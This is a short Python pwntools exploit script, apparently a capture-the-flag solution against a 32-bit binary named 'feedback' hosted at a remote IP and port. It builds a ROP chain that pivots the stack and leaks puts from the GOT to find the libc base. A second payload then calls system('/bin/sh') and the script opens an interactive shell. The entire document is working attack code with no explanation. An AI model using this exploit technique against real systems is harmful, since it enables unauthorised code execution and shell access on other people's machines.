from pwn import *

debug = 0

if(debug):
	r = process("./feedback")
	gdb.attach(r)
	puts_off = 0x00071cd0
	sys_off = 0x00045830
	binsh_off = 0x192352
else:
	r = remote("45.119.84.224", 10801)	
	puts_off = 0x0067460
	sys_off = 0x0003ce10
	binsh_off = 0x17b88f



r.recvuntil(b'nter your name:')
r.sendline(b'abcd')

r.recvuntil(b'eedback?(y,n)')
r.send(b'y')
r.recvuntil(b'hat is your feedback?')

bss = 0x0804a939
leave_ret = 0x08048575
puts_got = 0x08049fd8
puts = 0x8048480
pop_ebx_ret = 0x08048435
pop_rbp_ret = 0x0804880b
pop_edi_pop_ebp_ret = 0x0804880a
scanf = 0x80484c0
_60s = 0x8048905
pop3_ret = 0x08048809
add8_pop_ret = 0x08048432
pop_4_ret = 0x08048808

#payload = b"a"*9*4 
payload =  p32(scanf) + p32(pop_4_ret) + p32(_60s) + p32(bss) + p32(bss) + p32(bss) + p32(leave_ret) 
payload += b'a'*(4*2)
payload += p32(0x08043939) + p32(puts) + p32(pop_ebx_ret) + p32(puts_got)



r.sendline(payload)


stuff = r.recvuntil(b'\xf7')[-4:]

libc_base = int.from_bytes(stuff, "little") - puts_off
print(hex(libc_base))

system = libc_base + sys_off
binsh = libc_base + binsh_off


payload = p32(0) + p32(system) + p32(leave_ret) + p32(binsh)
r.sendline(payload)


r.interactive()